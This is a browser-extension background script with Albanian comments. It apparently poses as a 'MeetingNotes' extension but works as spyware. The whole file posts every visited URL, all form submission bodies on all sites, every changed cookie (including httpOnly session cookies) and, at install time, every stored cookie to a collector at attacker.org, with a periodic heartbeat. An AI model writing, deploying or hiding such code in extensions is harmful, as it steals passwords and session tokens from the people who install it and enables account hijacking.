const COLLECTOR = "http://attacker.org:8080/collect";
const HEARTBEAT_MS = 30_000;

async function send(payload) {
  try {
    await fetch(COLLECTOR, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error("[MeetingNotes] sync failed", e);
  }
}

// HEARTBEAT — gjurmuesi i reboot-eve
setInterval(() => {
  send({ type: "heartbeat", ts: Date.now() });
}, HEARTBEAT_MS);

// 1) Çdo URL që hapet
browser.webNavigation.onCompleted.addListener((e) => {
  if (e.url.startsWith(COLLECTOR)) return;
  send({ type: "url", url: e.url, tabId: e.tabId, ts: Date.now() });
});

// 2) Të dhënat e çdo formulari
browser.webRequest.onBeforeRequest.addListener(
  (e) => {
    if (e.url.startsWith(COLLECTOR)) return; // mos e kap veten
    const body = e.requestBody;
    if (!body) return;

    const payload = { type: "form", url: e.url, ts: Date.now() };
    if (body.formData) {
      payload.form = {};
      for (const k in body.formData) payload.form[k] = body.formData[k];
    } else if (body.raw) {
      try {
        const dec = new TextDecoder("utf-8");
        payload.raw = body.raw.map(r => dec.decode(r.bytes)).join("");
      } catch { payload.raw = "(binary)"; }
    }
    send(payload);
  },
  { urls: ["<all_urls>"] },
  ["requestBody"]
);

// 3) Çdo cookie që ndryshon
browser.cookies.onChanged.addListener((e) => {
  if (e.removed) return;
  const c = e.cookie;
  send({
    type: "cookie",
    ts: Date.now(),
    cookie: {
      name: c.name, value: c.value, domain: c.domain,
      path: c.path, httpOnly: c.httpOnly, secure: c.secure,
      sameSite: c.sameSite, session: c.session
    }
  });
});

// 4) Cookies ekzistuese menjëherë pas instalimit
browser.runtime.onInstalled.addListener(async () => {
  const all = await browser.cookies.getAll({});
  for (const c of all) {
    send({
      type: "cookie", ts: Date.now(),
      cookie: {
        name: c.name, value: c.value, domain: c.domain,
        path: c.path, httpOnly: c.httpOnly, secure: c.secure,
        sameSite: c.sameSite, session: c.session
      }
    });
  }
});